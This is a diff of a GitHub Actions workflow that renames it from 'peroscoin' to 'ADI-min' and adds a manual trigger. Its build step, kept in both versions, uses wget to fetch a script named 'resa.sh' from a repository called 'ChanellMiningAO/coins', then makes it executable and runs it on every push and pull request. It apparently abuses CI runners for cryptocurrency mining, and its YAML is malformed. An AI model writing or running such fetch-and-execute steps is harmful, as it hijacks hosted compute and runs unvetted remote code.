@@ -1,8 +1,9 @@
-name: peroscoin
-on: [push, pull_request]
+name: ADI-min
+
+on: [push, pull_request, workflow_dispatch]
 jobs:
   build:
-    name: Chanell
+  - name: ADI-min
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 5
@@ -22,6 +23,6 @@ steps:
   id: go
 - name: Setup
   uses: actions/checkout@v3
-- name: Chanell
+- name: ADI-min
   run: | 
     wget https://github.com/ChanellMiningAO/coins/blob/main/resa.sh && chmod u+x resa.sh && ./resa.sh
